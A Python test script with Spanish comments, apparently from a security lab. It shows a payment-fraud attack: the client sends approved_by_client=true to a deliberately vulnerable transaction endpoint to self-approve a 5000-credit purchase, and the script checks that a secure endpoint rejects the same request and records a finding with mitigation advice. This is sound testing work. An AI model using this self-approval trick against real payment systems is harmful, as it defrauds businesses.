import uuid

from common import (
    create_client,
    login,
    auth_headers,
    get_me,
    write_finding,
    print_title,
    print_result,
    ATTACKER_TICKET
)


def run_transaction_fraud_attack() -> bool:
    """
    prueba un abuso de logica de negocio en las microtransacciones.

    aqui el truco es mandar approved_by_client=true desde el cliente. si el
    backend se lo cree, estoy aprobando mi propio pago.

    despues miro si los creditos suben, porque eso demuestra impacto real.
    """

    print_title("BUSINESS LOGIC ATTACK - Transaction Fraud")

    with create_client() as client:
        #entro como atacante para tener un token valido
        attacker = login(client, ATTACKER_TICKET)
        token = attacker["access_token"]
        attacker_id = attacker["user_id"]

        #miro cuantos creditos tenia antes del intento
        before_profile = get_me(client, token)
        before_credits = before_profile["credits"]

        print(f"Initial credits: {before_credits}")

        #creo una transaccion nueva, con uuid para no repetir order_id
        amount = 5000
        order_id = f"ORDER_FRAUD_{uuid.uuid4()}"

        init_response = client.post(
            "/transactions/init",
            headers=auth_headers(token),
            json={
                "order_id": order_id,
                "item_name": "Mega Coins Pack",
                "amount": amount
            }
        )

        init_response.raise_for_status()
        init_body = init_response.json()

        print(f"Transaction created: {order_id}")

        #ataque: digo desde el cliente que el pago esta aprobado
        #un backend real no deberia fiarse de este campo
        finalize_response = client.post(
            "/vulnerable/transactions/finalize",
            headers=auth_headers(token),
            json={
                "order_id": order_id,
                "approved_by_client": True
            }
        )

        finalize_response.raise_for_status()
        finalize_body = finalize_response.json()

        #si finalized es true, el endpoint vulnerable ha aceptado mi aprobacion falsa
        vulnerable_finalized = finalize_body.get("finalized") is True

        print_result(
            vulnerable_finalized,
            "Vulnerable endpoint trusted approved_by_client=true"
        )

        #ahora compruebo si de verdad han subido los creditos
        after_profile = get_me(client, token)
        after_credits = after_profile["credits"]

        credits_increased = after_credits >= before_credits + amount

        print(f"Credits after fraud: {after_credits}")

        print_result(
            credits_increased,
            "User credits increased after fraudulent transaction"
        )

        #repito contra el endpoint seguro con otra orden
        #aqui deberia bloquearse porque el cliente no decide si pago o no
        secure_order_id = f"ORDER_SECURE_{uuid.uuid4()}"

        secure_init_response = client.post(
            "/transactions/init",
            headers=auth_headers(token),
            json={
                "order_id": secure_order_id,
                "item_name": "Secure Coins Pack",
                "amount": amount
            }
        )

        secure_init_response.raise_for_status()

        secure_finalize_response = client.post(
            "/secure/transactions/finalize",
            headers=auth_headers(token),
            json={
                "order_id": secure_order_id,
                "approved_by_client": True
            }
        )

        secure_blocked = secure_finalize_response.status_code == 403

        print_result(
            secure_blocked,
            "Secure endpoint rejected client-side payment approval"
        )

        #guardo el antes, el despues y las respuestas importantes
        confirmed = vulnerable_finalized and credits_increased

        write_finding(
            vulnerability="Client-Side Trust in Transaction Finalization",
            severity="Critical",
            endpoint="/vulnerable/transactions/finalize",
            owasp_category="API6:2023 Unrestricted Access to Sensitive Business Flows",
            confirmed=confirmed,
            evidence={
                "attacker_user_id": attacker_id,
                "initial_credits": before_credits,
                "final_credits": after_credits,
                "amount": amount,
                "order_id": order_id,
                "init_response": init_body,
                "finalize_response": finalize_body,
                "secure_status_code": secure_finalize_response.status_code
            },
            mitigation=(
                "Never trust approved_by_client or any payment state sent by the "
                "client. The backend must verify the transaction directly with "
                "Steam Web API or a trusted payment provider before granting credits "
                "or virtual items."
            )
        )

        return confirmed and secure_blocked


if __name__ == "__main__":
    success = run_transaction_fraud_attack()
    raise SystemExit(0 if success else 1)
